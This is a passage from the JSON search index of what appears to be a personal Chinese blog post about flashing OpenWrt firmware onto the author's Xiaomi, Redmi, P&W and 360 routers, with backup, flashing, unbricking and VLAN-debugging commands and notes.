         3.8M      3.8M         0 100% /rom\ntmpfs                    58.8M      1.1M     57.7M   2% /tmp\n/dev/mtdblock10           8.3M      2.1M      6.2M  25% /overlay\noverlayfs:/overlay        8.3M      2.1M      6.2M  25% /\ntmpfs                   512.0K         0    512.0K   0% /dev\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#mi-r3g","title":"MI R3G","text":"<p>\u5b98\u65b9\u6559\u7a0b\uff1a[OpenWrt Wiki] Xiaomi Mi WiFi R3G (Mi Wifi Router 3G / MIR3G / MI3G / mi4a Gigabit)</p> <p>r3g \u5b98\u65b9\u56fa\u4ef6\u4e0b\u8f7d\uff1aOpenWrt Firmware Selector</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u51c6\u5907","title":"\u51c6\u5907","text":"<ul> <li>FAT32 \u683c\u5f0f U \u76d8</li> <li>\u4e00\u679a\u9488\u7528\u4e8e\u6233\u8def\u7531\u5668 reset \u952e</li> <li>\u624b\u673a\u5b89\u88c5 MIWIFI app</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5f00\u542f-ssh","title":"\u5f00\u542f ssh","text":"<ol> <li> <p>\u66f4\u65b0\u4e3a\u5c0f\u7c73\u5f00\u53d1\u7248\u56fa\u4ef6\uff1ahttps://bigota.miwifi.com/xiaoqiang/rom/r3g/miwifi_r3g_firmware_12f97_2.25.124.bin</p> </li> <li> <p>\u4e0b\u8f7d\u5c0f\u7c73\u8def\u7531\u5668\u624b\u673a\u5ba2\u6237\u7aef (\u5e94\u7528\u5546\u5e97 MI WIFI) \u8f6f\u4ef6\uff0c\u7ed1\u5b9a\u8def\u7531\u5668</p> </li> <li> <p>\u6839\u636e https://d.miwifi.com/rom/ssh\uff0c\u5f00\u542f SSH</p> <p>p.s. 1. \u5373\u4f7f\u662f\u540c\u4e00\u578b\u53f7\uff0cmiwifi_ssh.bin \u4e5f\u662f\u4e0d\u540c\u7684\uff1b2. ssh \u5bc6\u7801\u663e\u793a\u5728\u8be5\u9875\u9762</p> <ol> <li>\u8bf7\u5c06\u4e0b\u8f7d\u7684\u5de5\u5177\u5305 bin \u6587\u4ef6\u590d\u5236\u5230 U \u76d8\uff08FAT/FAT32 \u683c\u5f0f\uff09\u7684\u6839\u76ee\u5f55\u4e0b\uff0c\u4fdd\u8bc1\u6587\u4ef6\u540d\u4e3a miwifi_ssh.bin\uff1b</li> <li>\u65ad\u5f00\u5c0f\u7c73\u8def\u7531\u5668\u7684\u7535\u6e90\uff0c\u5c06 U \u76d8\u63d2\u5165 USB \u63a5\u53e3\uff1b</li> <li>\u6309\u4f4f reset \u6309\u94ae\u4e4b\u540e\u91cd\u65b0\u63a5\u5165\u7535\u6e90\uff0c\u6307\u793a\u706f\u53d8\u4e3a\u9ec4\u8272\u95ea\u70c1\u72b6\u6001\u5373\u53ef\u677e\u5f00 reset \u952e\uff1b</li> <li>\u7b49\u5f85 3-5 \u79d2\u540e\u5b89\u88c5\u5b8c\u6210\u4e4b\u540e\uff0c\u5c0f\u7c73\u8def\u7531\u5668\u4f1a\u81ea\u52a8\u91cd\u542f\uff0c\u4e4b\u540e\u60a8\u5c31\u53ef\u4ee5\u5c3d\u60c5\u6298\u817e\u5566\uff1a\uff09</li> </ol> </li> </ol>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5907\u4efd","title":"\u5907\u4efd","text":"<p>\u67e5\u770b mtd \u5206\u533a</p> <pre><code>root@XiaoQiang:~# cat /proc/mtd\ndev:    size   erasesize  name\nmtd0: 07f80000 00020000 \"ALL\"\nmtd1: 00080000 00020000 \"Bootloader\"\nmtd2: 00040000 00020000 \"Config\"\nmtd3: 00040000 00020000 \"Bdata\"\nmtd4: 00040000 00020000 \"Factory\"\nmtd5: 00040000 00020000 \"crash\"\nmtd6: 00040000 00020000 \"crash_syslog\"\nmtd7: 00040000 00020000 \"reserved0\"\nmtd8: 00400000 00020000 \"kernel0\"\nmtd9: 00400000 00020000 \"kernel1\"\nmtd10: 02000000 00020000 \"rootfs0\"\nmtd11: 02000000 00020000 \"rootfs1\"\nmtd12: 03580000 00020000 \"overlay\"\nmtd13: 012a6000 0001f000 \"ubi_rootfs\"\nmtd14: 030ec000 0001f000 \"data\"\n</code></pre> <p>\u5907\u4efd factory \u5206\u533a</p> <pre><code>cat /dev/mtd4 &gt; /tmp/factory.bin\n\n#on windows\nscp root@192.168.33.193:/tmp/factory.bin .\nscp root@192.168.33.228:/tmp/factory.bin .\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5237-openwrt","title":"\u5237 openwrt","text":"<pre><code>mtd write openwrt-18.06.2-ramips-mt7621-mir3g-squashfs-kernel1.bin kernel1\nmtd write openwrt-18.06.2-ramips-mt7621-mir3g-squashfs-rootfs0.bin rootfs0\nnvram set flag_try_sys1_failed=1\nnvram commit\nreboot\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#ax6s","title":"AX6S","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u6b65\u9aa4_1","title":"\u6b65\u9aa4","text":"<p>[OpenWrt Wiki] Xiaomi AX3200 / Redmi AX6S YangWang92/AX6S-unlock (github.com) [2-2]AX6S \u95ed\u6e90\u65e0\u7ebf\u9a71\u52a8Openwrt \u5237\u673a\u6559\u7a0b/\u56fa\u4ef6\u4e0b\u8f7d-\u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u53ca\u5c0f\u7c73\u7f51\u7edc\u8bbe\u5907-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b (right.com.cn)</p> <ul> <li> <p>telnet \u540e\u624b\u52a8\u5f00\u542f ssh</p> <pre><code>/etc/init.d/dropbear start\n</code></pre> <p>\u200b tips: \u4f7f\u7528 git-bash \u7248\u672c\u7684 ssh \u8fde\u63a5\u62a5\u9519\u3002\u4f7f\u7528 cmd \u7684 ssh \u53ef\u4ee5\u3002</p> <pre><code>Unable to negotiate with 192.168.31.1 port 22: no matching host key type found. Their offer: ssh-rsa\n</code></pre> </li> </ul> <ul> <li> <p>\u5fc5\u987b\u6dfb\u52a0 boot_fw1 \u6539\u884c\uff0c\u5426\u5219\u91cd\u542f\u540e\u8fdb\u5165\u539f\u7cfb\u7edf\u3002</p> <pre><code>nvram set ssh_en=1\nnvram set uart_en=1\nnvram set boot_wait=on\nnvram set flag_boot_success=1\nnvram set flag_try_sys1_failed=0\nnvram set flag_try_sys2_failed=0\nnvram set \"boot_fw1=run boot_rd_img;bootm\"\nnvram commit\n</code></pre> </li> </ul> <ul> <li>\u5237\u5199 factory.bin-&gt; firmware \u5206\u533a</li> </ul> <p>AX6S \u4e3a\u56fd\u5185\u7248\uff0c\u56fd\u5916\u7248\u79f0\u4e3a AX3200</p> <ul> <li>SoC\uff1aMT7622B: 2 x A53@1.35GHz CPU\u3002<ul> <li>\u6ee1\u8840\u7248\u672c\u662f MT7622A\uff0c\u5c11\u4e86\u84dd\u7259\u5c31\u662f MT7622BV\uff0c\u6ca1\u6709\u84dd\u7259\u548c\u591a\u5a92\u4f53\u529f\u80fd\u7684\u662f MT7622B\uff0c\u57fa\u672c\u5269\u4e0b\u65e0\u7ebf\u529f\u80fd\u7684\u662f MT7622E</li> </ul> </li> <li>ram: 256 + flash: 128</li> <li>[OpenWrt Wiki] Xiaomi AX3200 / Redmi AX6S</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5751sysupgrade-\u53d8\u7816","title":"\u5751\uff1asysupgrade \u53d8\u7816","text":"<p>\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48 wifi \u4e0b\u8f7d\u901f\u5ea6\u53ea\u80fd\u8dd1\u5230 100Mbps\uff0cwin11 \u4e2d\u663e\u793a\u94fe\u63a5\u901f\u5ea6\u4e00\u8fb9\u5f88\u4f4e\u3002\u56e0\u6b64\u60f3\u8981\u5347\u7ea7\u4e0b\u7cfb\u7edf\u3002</p> <p>2024-06-02 \u4ece 22 \u5347\u7ea7\u5230 23.05.3 \u540e\uff0c\u673a\u5668\u542f\u52a8\u4e00\u76f4\u53cd\u590d\u9ec4\u706f\u3002\u5347\u7ea7\u65f6\u4fdd\u7559\u4e86\u914d\u7f6e\u3002\u6682\u65f6\u4e0d\u6e05\u695a\u662f\u4ec0\u4e48\u539f\u56e0</p> <p>\u53d1\u73b0\u662f\u4e2a\u666e\u904d\u95ee\u9898\uff0c\u5b98\u65b9\u6587\u6863\u91cc\u5199\u4e86\u3002</p> <p>AX6S\u5237OP\u5fc5\u7816-\u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u53ca\u5c0f\u7c73\u7f51\u7edc\u8bbe\u5907-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b (right.com.cn) https://openwrt.org/toh/xiaomi/ax3200#upgrading_openwrt AX6s \u53d8\u7816\u4e86\uff0c\u6709\u5927\u795e\u53ef\u4ee5\u770b\u770b\u5982\u4f55\u6551\u7816\u5417\uff1f-\u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u53ca\u5c0f\u7c73\u7f51\u7edc\u8bbe\u5907-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b (right.com.cn)</p> <p>\u6551\u7816</p> <ul> <li>\u5c0f\u7c73\u5b98\u65b9\u5de5\u5177\uff1a\u6ca1\u663e\u793a\u652f\u6301\u7ea2\u7c73 ax6s\u3002\u4f46\u662f\u6709\u4eba\u8bf4\u53ef\u4ee5\uff0c\u6709\u4eba\u8bf4\u4e0d\u53ef\u4ee5</li> <li>op \u5b98\u65b9\u6559\u7a0b\u4e2d\u7684 tftp \u6062\u590d<ul> <li>\u4e2d\u6587\u63d0\u5230\u4e86\u8bbe\u7f6e dhcp server start 192.168.31.2\uff0c\u957f\u5ea6\u4e3a1\uff1aAX6s \u53d8\u7816\u4e86\uff0c\u6709\u5927\u795e\u53ef\u4ee5\u770b\u770b\u5982\u4f55\u6551\u7816\u5417\uff1f-\u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u53ca\u5c0f\u7c73\u7f51\u7edc\u8bbe\u5907-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b (right.com.cn)</li> <li>tftpd \u8f6f\u4ef6\u6ca1\u6709 start \u6309\u94ae\uff0c\u914d\u7f6e dhcp server \u548c tftp server \u5373\u53ef\u3002</li> </ul> </li> <li>\u5c31\u7b97\u4f7f\u7528\u7f16\u7a0b\u5668\uff0c\u662f WSON \u63a5\u53e3\uff0c\u4e5f\u6ca1\u6cd5\u4f7f\u7528\u5939\u5b50\u3002\u56e0\u6b64\u5fc5\u987b\u710a\u63a5\uff0c\u800c\u6211\u6ca1\u5668\u6750\uff0c\u4e5f\u4e0d\u592a\u4f1a\u3002</li> </ul> <p>\u7ed3\u679c\u4e24\u4e2a\u65b9\u6cd5\u5bf9\u6211\u90fd\u6ca1\u7528\u3002</p> <p>\u53d1\u73b0\u95ee\u9898\u5728\u4e8e\u628a mesh \u6309\u94ae\u770b\u6210\u4e86 reset \u952e\u3002\u5bfc\u81f4\u7b2c\u4e00\u6b65\u8fdb\u5165 reset \u6a21\u5f0f\u5c31\u5931\u8d25\u4e86\uff0c\u7f51\u5361\u6ca1\u6709\u521d\u59cb\u5316\uff0cPC \u4e0a\u663e\u793a\u4e3a\u672a\u8fde\u63a5\u3002\uff08\u4e3a\u4e86\u53d1\u73b0\u8fd9\u4e00\u70b9\u5bf9\u201creset\u201d\u540e\u9ec4\u706f\u7684\u4eae\u7684\u89c4\u5f8b\u8fdb\u884c\u4e86\u8ba1\u65f6\uff0c\u53d1\u73b0\u6309\u4e0d\u6309\uff0c\u90fd\u662f12s\u5de6\u53f3\u706d\u4e00\u6b21\uff09</p> <p>\u6b63\u786e\u7684\u6309 reset \u540e\uff0c\u901a\u8fc7 tftp \u65b9\u6cd5\u6062\u590d\u4e86\u539f\u5382\u7cfb\u7edf\u3002</p> <p>\u4e4b\u540e\u901a\u8fc7 telnet \u7684\u65b9\u5f0f\uff0c\u5237\u5165\u4e86 23.5.2 \u7684 factory\u3002\u6062\u590d backup \u7684\u914d\u7f6e\uff0c\u5c31\u56de\u5230\u4e86\u4e4b\u524d\u7684\u72b6\u6001\u3002</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u7ade\u6597\u4e91-20pw","title":"\u7ade\u6597\u4e91 2.0\uff08P&amp;W)","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u8d44\u6599","title":"\u8d44\u6599","text":"<p>[OpenWrt Wiki] P&amp;W R619AC</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u6559\u7a0b","title":"\u6559\u7a0b","text":"<p>\u9700\u8981\u5148\u5237\u5165 opboot\uff08\u4e00\u4e2a\u7b2c\u4e09\u65b9 bootloader\uff09\u7ade\u6597\u4e91 2 \u5237 opboot - \u8def\u7531\u667a\u6001 (red-yellow.net)</p> <p>\u7136\u540e\u518d\u5237 openwrt\u3002 \u7f16\u8bd1\uff1a\u7ade\u6597\u4e91 2 \u7684 OpenWrt \u56fa\u4ef6 - \u8def\u7531\u667a\u6001 (red-yellow.net) \u5237\u7684\u8fd9\u91cc\u4f5c\u8005\u63d0\u4f9b\u7684 immortalwrt\uff1a\u3010\u65b0\u63d0\u9192\u3011\u30102023-6-13\u3011\u7ade\u6597\u4e91 2.0P&amp;W-R619AC OPENWRT \u56fa\u4ef6 | \u63d2\u4ef6\u5168\u9762 | \u591a\u7248\u672c-OPENWRT \u4e13\u7248 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</p> <p>\u4e4b\u524d\u4f7f\u7528 switch \u5b98\u65b9\u56fa\u4ef6 22.03\uff0c\u770b\u5230 device \u6709 eth0, eth1\uff0c\u7136\u540e switch \u754c\u9762\u53ef\u4ee5\u8bbe\u7f6e 4 \u4e2a lan \u53e3 \u4f46\u662f\u95ee\u9898\u662f\u53ea\u8981\u4e00\u6539\u52a8 vlan \u8bbe\u7f6e\uff0c\u901a\u8fc7 wan \u53e3\uff08\u5f00\u542f 192.168.99.0 \u7684 dhcp\uff09\u8bbf\u95ee p2w \u5c31\u4f1a\u6389</p> <p>\u540e\u9762\u5237\u4e86\u4e00\u4e2a\u5176\u5b83\u4eba\u7f16\u8bd1\u7684 immortalwrt \u56fa\u4ef6\uff0c\u53d1\u73b0\u5176\u5b9e\u53ea\u6709\u4e00\u4e2a eth0\u3002wan \u53e3 eth0.2 \u662f\u4e00\u4e2a vlan\u3002switch \u754c\u9762\u6709 4 \u4e2a lan \u548c 1 \u4e2a wan \u53ef\u4ee5\u914d\u7f6e\u3002 \u8fd9\u4e0b\u914d\u7f6e switch vlan \u5f02\u5e38\u7a33\u5b9a\u987a\u7545 </p> <p>\u8fd9\u91cc CPU \u7aef\u53e3\u7684 tag \u548c untag</p> <ul> <li>\u8bbe\u7f6e\u4e3a off\uff0c\u5219\u4e0d\u5b58\u5728 eth0.3 \u8bbe\u5907</li> <li>\u8bbe\u7f6e\u4e3a tag \u5219 eth0.3 \u4e0a tcpdump \u80fd\u6536\u5230\u5f88\u591a\u5305</li> <li>\u8bbe\u7f6e\u4e3a untag\uff0c\u5219\u6536\u4e0d\u5230\u5305</li> </ul> <p>\u6536\u5230\u7684\u5305\u5176\u5b9e\u53ea\u6709\u5e7f\u64ad\u7b49\u60c5\u51b5\uff0c\u5426\u5219\u5305\u76f4\u63a5\u4ece\u7279\u5b9a\u7aef\u53e3\u51fa\u53bb\u4e86\uff0c\u4e0d\u4f1a\u5f80\u5176\u5b83\u7aef\u53e3\u53d1\u3002</p> <pre><code>root@p2w:~# tcpdump -ni eth0.3 host 114.214.236.72\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on eth0.3, link-type EN10MB (Ethernet), capture size 262144 bytes\nq01:50:16.005639 IP 114.214.236.72.45520 &gt; 239.255.255.250.1900: UDP, length 94\n01:50:16.006412 ARP, Request who-has 114.214.236.74 tell 114.214.236.72, length 46\n01:50:16.173072 ARP, Request who-has 114.214.236.96 tell 114.214.236.72, length 46\n01:50:16.926278 ARP, Request who-has 114.214.236.200 tell 114.214.236.72, length 46\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u9047\u5230\u95ee\u9898","title":"\u9047\u5230\u95ee\u9898","text":"<p>\u7ecf\u5e38\u6027\u7684\u6389\u7f51\u7edc\uff0c\u7814\u7a76\u540e\u53d1\u73b0\u662f ap \u7684 br-lan \u548c\u4e0a\u6e38\u65e0\u6cd5\u8fde\u63a5\u4e86\u3002\u901a\u8fc7\u65e0\u7ebf\u624b\u52a8\u8bbe\u7f6e\u9759\u6001 ip \u53ef\u4ee5\u8fde\u4e0a p2w\u3002\u5c1d\u8bd5 ping \u7f51\u5173\u5730\u5740\uff0c\u53d1\u73b0 eth0.1 \u4e0a\u80fd\u6293\u5230 arp \u5305\uff0c\u4f46\u662f\u4e0a\u6e38\u5bf9\u5e94 bridge \u5374\u6293\u4e0d\u5230\u3002\u53cd\u8fc7\u6765\uff0c\u4e0a\u6e38 arping ap \u5730\u5740\uff0cap \u4e5f\u6536\u4e0d\u5230\u5305\u3002</p> <ul> <li>\u6d4b\u8bd5\u5982\u679c\u628a\u8fde\u63a5 ap \u7684\u7f51\u7ebf\u8fde\u63a5\u7b14\u8bb0\u672c\uff0c\u7f51\u7edc\u662f\u6b63\u5e38\u7684\uff0c\u56e0\u6b64\u6392\u9664\u4e0a\u6e38\u95ee\u9898\u3002</li> </ul> <pre><code>arping -i interface \u6d4b\u8bd5\u4e8c\u5c42\u662f\u5426\u901a\narp\u67e5\u770b\u5f53\u524dmac\u8868\ntcpdump -ni eth0.1 arp\n</code></pre> <p>\u6ca1\u529e\u6cd5\uff0c\u4e0d\u77e5\u5982\u4f55\u89e3\u51b3\uff0c\u53ea\u597d\u91cd\u88c5\u4e86\u5b98\u65b9 22.03.5 \u7684\u7cfb\u7edf\u3002\u5b98\u65b9\u7cfb\u7edf\u628a wan \u5355\u72ec\u62ff\u4e86\u51fa\u6765\u4f5c\u4e3a eth1\uff0c\u800c switch \u754c\u9762\u53ef\u4ee5\u914d\u7f6e eth0 \u548c\u5269\u4f59\u56db\u4e2a\u7aef\u53e3</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#360-t7","title":"360 T7","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u57fa\u672c\u53c2\u6570","title":"\u57fa\u672c\u53c2\u6570","text":"<p>mt7681:2xA53@1.3GHz 256 RAM+ 128 NAND</p> <p>\u4ef7\u683c</p> <ul> <li>\u539f\u7248 118x2 \u5305\u90ae\uff0c\u9b54\u6539 512 \u5185\u5b58\u7248\uff1a150</li> </ul> <p></p> <p>\u5f85\u673a 60 \u591a\u5ea6\u6709\u6bd2\uff0c\u770b\u6765\u8fd8\u662f\u9700\u8981\u81ea\u5df1\u52a0\u6563\u70ed\u7247</p> <p>40(30\uff0c\u6700\u5c0f\u8986\u76d6\u4e24\u4e2a\u7684\u8ddd\u79bb) x25\uff08\u6df1\u5ea6 10mm\uff09</p> <ul> <li>13x7</li> <li>12x13 25x25</li> <li>10x12 30x25\uff08\u6df1\u5ea6\uff1a15mm\uff09</li> <li>13x14</li> </ul> <p>\u5355\u4e2a\u82af\u7247\uff1a14x14 \u6574\u4e2a\u76d6\u4f4f\uff1a25x25\uff0c30x20</p> <p>hanwckf's blog 360 T7 \u5237 openwrt \u6559\u7a0b\uff5c\u6700\u5f3a\u7684\u767e\u5143\u8def\u7531\u5668 | \u9171\u7d2b\u8868 (qust.me) \u3010\u65b0\u63d0\u9192\u3011360T7 openwrt \u56fa\u4ef6\u53d1\u5e03\uff0c\u611f\u8c22 H \u5927-OPENWRT \u4e13\u7248 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn) \u63d0\u5230\u4e86 ipv6 + wiregaurd + hnat \u6709\u95ee\u9898\uff1f[\u907f\u5751] 360T7 - V2EX</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u51c6\u5907_1","title":"\u51c6\u5907","text":"<p>\u786c\u4ef6</p> <ul> <li>\u62c6\u673a\u5de5\u5177\uff1a\u87ba\u4e1d\u5200\uff0c\u64ac\u7247\uff08\u6ca1\u5b83\u771f\u6253\u4e0d\u5f00\uff09</li> <li>usb \u8f6c ttl \u6a21\u5757\uff0c\u675c\u90a6\u7ebf\u516c\u5bf9\u6bcd</li> </ul> <p>\u8f6f\u4ef6</p> <ul> <li>putty \u7b49\u4e32\u53e3\u8f6f\u4ef6</li> <li>\u4fee\u6539\u7248 uboot\uff1aRelease 20230727 \u00b7 hanwckf/bl-mt798x (github.com)</li> <li>\u56fa\u4ef6\uff1a237, immortal \u539f\u7248</li> <li>\u53ef\u80fd\u9700\u8981\uff1a\u65e7\u7248\u539f\u5382\u56fa\u4ef6\uff0c\u65b0\u7248\u56fa\u4ef6\u5173\u95ed\u4e86 failsafe \u6a21\u5f0fhqvv/360T7: qihoo 360T7 resources and official firmware (github.com)</li> <li>\u53ef\u9009\uff0cwindows netcat\uff0c\u7528\u4e8e\u5728 failsafe \u6a21\u5f0f\u4e0b\u5907\u4efd\u8def\u7531\u5668 flash\u3002</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#1-\u62c6\u673a\u548c-ttl-\u6a21\u5757\u8fde\u63a5","title":"1. \u62c6\u673a\u548c TTL \u6a21\u5757\u8fde\u63a5","text":"<p>\u62c6\u673a\u6ce8\u610f\uff1a</p> <ul> <li>\u8def\u7531\u5668\u53ea\u6709\u4e24\u4e2a\u87ba\u4e1d\uff0c\u90fd\u88ab\u80cc\u9762\u8d34\u7eb8\u76d6\u4f4f\u4e86</li> <li>\u4e00\u5171\u6709 2+8 \u4e2a\u5361\u53e3\uff0c\u975e\u5e38\u96be\u62c6\u3002\u4f18\u5148\u4ece\u8def\u7531\u5668\u4e0b\u65b9\u64ac\u5f00\uff0c\u7136\u540e\u518d\u4e24\u4fa7\uff0c\u6700\u540e\u4e0a\u4fa7\u6bd4\u8f83\u5bb9\u6613\u3002<ul> <li>\u89c6\u9891\u53c2\u8003\uff1a360T7 \u7b2c\u4e8c\u90e8\u5206\u62c6\u673a_\u54d4\u54e9\u54d4\u54e9_bilibili</li> </ul> </li> </ul> <p>TTL \u6a21\u5757\u8fde\u63a5 \u677f\u5b50\u5de6\u4e0a\u89d2\u56db\u4e2a\u89e6\u5b54\uff0c\u4ece\u4e0a\u5230\u4e0b\uff1aRX, TX, GND\u3002\u6ce2\u7279\u7387 115200</p> <ul> <li>\u6ce8\u610f\uff0c\u5bf9\u5e94 TTL \u6a21\u5757\u4e00\u4fa7\uff0cRX \u9700\u8981\u5bf9\u5e94 TX\uff0cTX \u5bf9\u5e94 RX</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#2-ttl-\u8fdb\u5165-failsafe-\u6a21\u5f0f\u5f00\u542f-telnet","title":"2. TTL \u8fdb\u5165 failsafe \u6a21\u5f0f\u5f00\u542f telnet","text":"<p>\u539f\u7406</p> <ul> <li>\u539f\u7cfb\u7edf\u4f7f\u7528 uboot\uff0c\u4f46\u662f\u5173\u95ed\u4e86 uboot \u83dc\u5355\uff0c\u5f00\u673a\u540e\u4f1a\u76f4\u63a5\u5f15\u5bfc\u5185\u6838</li> <li>\u539f\u7cfb\u7edf\u5f15\u5bfc\u8fc7\u7a0b\u4e2d\u652f\u6301 failsafe \u6a21\u5f0f\uff0c\u8fdb\u5165\u540e\u53ef\u4ee5 mount_root\uff0c\u5bf9\u6587\u4ef6\u7cfb\u7edf\u8fdb\u884c\u4fee\u6539\uff0c\u4ece\u800c\u53ef\u4ee5\u5f00\u542f telnet</li> </ul> <p>\u8fc7\u7a0b</p> <ul> <li>\u8fde\u63a5\u597d\u4e32\u53e3\uff0c\u5e76\u6253\u5f00 putty \u540e\uff0c\u63d2\u7535\u5f00\u673a\uff0c\u8def\u7531\u5668\u542f\u52a8\u5e76\u8f93\u51fa\u4fe1\u606f</li> <li>\u5728\u5f15\u5bfc\u5185\u6838\u8fc7\u7a0b\u4e2d\uff0c\u4f1a\u51fa\u73b0\u8fdb\u5165 failsafe \u63d0\u793a\uff0c\u6309 f+enter \u5373\u53ef\u8fdb\u5165\u3002\u5927\u6982\u6709 3 \u79d2\u7b49\u5f85\u65f6\u95f4\u3002<ul> <li>\u5982\u679c\u6ca1\u51fa\u73b0\uff0c\u9700\u8981\u964d\u7ea7\u539f\u7cfb\u7edf\u3002\u3010\u65b0\u63d0\u9192\u3011360t7m(t7 \u79fb\u52a8\u5b9a\u5236\u7248) \u65e0\u6cd5\u8fdb\u5165 failsafe \u6a21\u5f0f-OPENWRT \u4e13\u7248 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn) </li> </ul> </li> </ul> <p>\u8fdb\u5165\u540e</p> <pre><code># \u5f00\u542fuboot\u63a7\u5236\u53f0\u83dc\u5355\nfw_setenv bootmenu_delay 3\n\n# \u6302\u8f7drootfs\u5e76\u5f00\u542ftelnet\nmount_root\nsed -i 's/.*local debug=.*/\\tlocal debug=1/' /etc/init.d/telnet\n\n# \u4fee\u6539root\u5bc6\u7801\npasswd root\n\n# \u91cd\u542f\nreboot\n</code></pre> <p>\u53ef\u4ee5\u9009\u62e9\u5907\u4efd\u56fa\u4ef6</p> <ul> <li>\u6ce8\u610f\u5343\u4e07\u4e0d\u8981 ping\uff0c\u5426\u5219\u65e0\u6cd5 ctrl-c</li> <li>nc \u7ed3\u675f\u540e\u4f1a\u81ea\u52a8\u9000\u51fa\uff0c128MB \u7684 flash \u4e0d\u5230 1 \u5206\u949f\u80fd\u591f\u4e0b\u8f7d\u5b8c\u3002</li> </ul> <pre><code># \u5c06\u7535\u8111\u7684IP\u5730\u5740\u8bbe\u7f6e\u4e3a192.168.1.8\uff0c\u63d2\u5165\u8def\u7531\u5668LAN\u53e3\n# \u4f7f\u7528nc\u76d1\u542c3333\u7aef\u53e3\u5e76\u5199\u5165all.bin\n# Windows\u7cfb\u7edf\u53ef\u4ee5\u4f7f\u7528netcat\n# nc -l -p 3333 &gt; all.bin\n\n# \u5728\u8def\u7531\u5668failsafe\u6a21\u5f0f\u4e0b\u5f00\u542f\u7f51\u7edc\nifconfig eth0 0.0.0.0\nbrctl addbr br-lan\nifconfig 